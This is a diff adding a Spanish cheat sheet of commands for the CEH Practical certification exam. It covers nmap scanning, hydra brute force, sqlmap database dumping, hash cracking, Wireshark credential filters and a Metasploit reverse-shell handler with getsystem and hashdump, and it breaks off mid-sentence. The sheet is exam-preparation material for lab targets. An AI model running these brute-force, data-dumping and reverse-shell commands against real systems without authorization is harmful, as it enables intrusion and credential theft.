@@ -3574,3 +3574,268 @@ text
 https://chirag-singla.notion.site/Module-15-SQL-Injection-6907bdc0e911489089ebc81d18658dc1
 https://github.com/Samsar4/Ethical-Hacking-Labs?tab=readme-ov-file
 https://github.com/System-CTL/CEH_CHEAT_SHEET
+
+#### ULTIMOS TIPS:
+
+# 🎯 Guía Rápida: Tipos de Preguntas CEH Practical Exam
+
+## 🔍 Reconocimiento y Enumeración
+
+### **Encontrar servicios y detectar OS**
+nmap -sV -O 192.168.1.100
+nmap -A 192.168.1.100
+ping 192.168.1.100
+
+text
+
+### **¿Qué puertos tiene la máquina IP X?**
+nmap -p- 192.168.1.100
+nmap -sS -O 192.168.1.100
+
+text
+
+### **¿Qué máquina tiene puertos por defecto?**
+Puertos comunes a buscar:
+21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS)
+139 (NetBIOS), 445 (SMB), 3389 (RDP), 53 (DNS)
+nmap -p 21,22,80,443,139,445,3389,53 192.168.1.0/24
+
+text
+
+### **Encontrar máquinas con MSSQL**
+nmap -p 1433 192.168.1.0/24 --open
+nmap --script ms-sql-info 192.168.1.0/24
+
+text
+
+### **Encontrar máquinas con Remote Desktop**
+nmap -p 3389 192.168.1.0/24 --open
+
+text
+
+---
+
+## 🔐 Ataques de Contraseña
+
+### **¿Cuál es la contraseña del usuario X del servidor FTP?**
+hydra -l usuario -P wordlist.txt ftp://192.168.1.100
+msfconsole
+use auxiliary/scanner/ftp/ftp_login
+
+text
+
+### **Usar Hydra para crackear contraseña**
+hydra -l admin -P rockyou.txt ssh://192.168.1.100
+hydra -L users.txt -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+text
+
+### **¿Qué usuario es válido usando fuerza bruta?**
+hydra -L userlist.txt -p password123 ssh://target
+wpscan --url http://target --enumerate u
+
+text
+
+---
+
+## 🌐 Web Application Testing
+
+### **¿Qué plugins tiene la página web (WordPress)?**
+wpscan --url http://example.com --enumerate p
+wpscan --url http://example.com --enumerate vp # vulnerables
+
+text
+
+### **¿Qué usuarios tiene la página web (WordPress)?**
+wpscan --url http://example.com --enumerate u
+wpscan --url http://example.com --enumerate u --passwords wordlist.txt
+
+text
+
+### **¿Qué base de datos tiene la página?**
+sqlmap -u "http://example.com/page.php?id=1" --dbs
+
+text
+
+### **¿Qué tablas/columnas tiene la base de datos?**
+sqlmap -u "URL" -D database_name --tables
+sqlmap -u "URL" -D database_name -T table_name --columns
+
+text
+
+### **Encontrar detalles de contacto de Jenny**
+sqlmap -u "URL" -D database -T users --dump
+sqlmap -u "URL" -D database -T users -C name,phone,email --dump
+
+text
+
+---
+
+## 📦 Análisis de Archivos y Esteganografía
+
+### **¿Cuál es la contraseña oculta en el archivo .jpeg?**
+steghide info imagen.jpg
+steghide extract -sf imagen.jpg
+hexdump -C imagen.jpg | grep -i password
+
+text
+
+### **¿Cuál es el mensaje oculto en el archivo .txt?**
+steghide extract -sf archivo.txt
+file archivo.txt
+strings archivo.txt
+cat -A archivo.txt # Mostrar caracteres no imprimibles
+
+text
+
+### **¿Qué tipo de encriptación usa el archivo/hash?**
+hash-identifier
+hashid hash_string
+file archivo_cifrado
+
+text
+
+### **¿Qué hash tiene el documento X?**
+md5sum documento.pdf
+sha1sum documento.pdf
+sha256sum documento.pdf
+
+text
+
+### **Identificar archivos de texto modificados (integridad)**
+md5sum *.txt > checksums_original.txt
+
+Después de modificaciones:
+md5sum -c checksums_original.txt
+
+text
+
+---
+
+## 🔓 Cracking de Hashes
+
+### **Crackear hashes MD5**
+john --format=raw-md5 hashes.txt
+hashcat -m 0 hashes.txt rockyou.txt
+hash-identifier # Para identificar tipo
+
+text
+
+### **Crackear hash de usuario X**
+john --wordlist=rockyou.txt hash.txt
+hashcat -m 1000 hash.txt rockyou.txt # NTLM
+hashcat -m 500 hash.txt rockyou.txt # MD5crypt
+
+text
+
+---
+
+## 📊 Análisis de Tráfico con Wireshark
+
+### **Encontrar X en archivo .pcap**
+Filtros comunes:
+http.request.method == "POST"
+ftp-data
+smtp
+tcp.stream eq 0
+ip.src == 192.168.1.100
+
+text
+
+### **¿Qué IP envió un correo electrónico?**
+Filtros en Wireshark:
+smtp.command_line contains "MAIL FROM"
+smtp.response.code == 250
+
+text
+
+### **¿Qué usuario/contraseña están en el archivo?**
+Filtros:
+http.request.method == "POST" and (http contains "user" or http contains "pass")
+ftp.request.command == "USER"
+ftp.request.command == "PASS"
+
+text
+
+### **Encontrar IPs atacantes DDoS del archivo pcap**
+Statistics → Endpoints → IPv4 (ordenar por packets)
+Statistics → Conversations → buscar patrones sospechosos
+
+text
+
+---
+
+## 🐭 RATs y Malware
+
+### **Herramientas GUI RAT**
+- **njRAT** (puerto por defecto: 5552)
+- **DarkComet**
+- **Poison Ivy**
+- **SpyNet**
+
+### **Encontrar username del atacante de la máquina**
+En Windows:
+net user
+whoami /all
+
+En logs de sistema:
+Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}
+
+text
+
+---
+
+## 🔐 Criptografía (4-5 problemas esperados)
+
+### **Herramientas GUI Windows para preparar:**
+- **CrypTool** - Análisis de cifrados clásicos
+- **BCTextEncoder** - Descifrado de texto codificado
+- **Ophcrack** - Rainbow tables para Windows
+- **L0phtCrack** - Auditoría de contraseñas
+- **HashCalc** - Cálculo de hashes
+- **QuickCrypto** - Cifrado/descifrado rápido
+
+---
+
+## 🎯 Metasploit (System Exploitation)
+
+### **Comandos esenciales:**
+msfconsole
+search type:exploit platform:windows
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST [IP]
+set LPORT [PORT]
+exploit
+
+En meterpreter:
+sysinfo
+getuid
+getsystem
+hashdump
+
+text
+
+---
+
+## 💡 Tips Finales para el Examen
+
+### **Herramientas que debes dominar:**
+- **nmap** - Reconocimiento
+- **wireshark** - Análisis de tráfico  
+- **hydra** - Fuerza bruta
+- **sqlmap** - SQL injection
+- **steghide** - Esteganografía
+- **john/hashcat** - Cracking
+- **metasploit** - Explotación
+
+### **Flujo general:**
+1. **Reconocimiento** → nmap
+2. **Análisis de servicios** → herramientas específicas
+3. **Explotación** → metasploit, sqlmap, etc.
+4. **Post-explotación** → meterpreter, file analysis
+5. **Análisis forense** → wireshark, steghide, hash analysis
+
+---
+
+> **Recuerda**: El examen es práctico. Practica cada comando y herramienta hasta que p
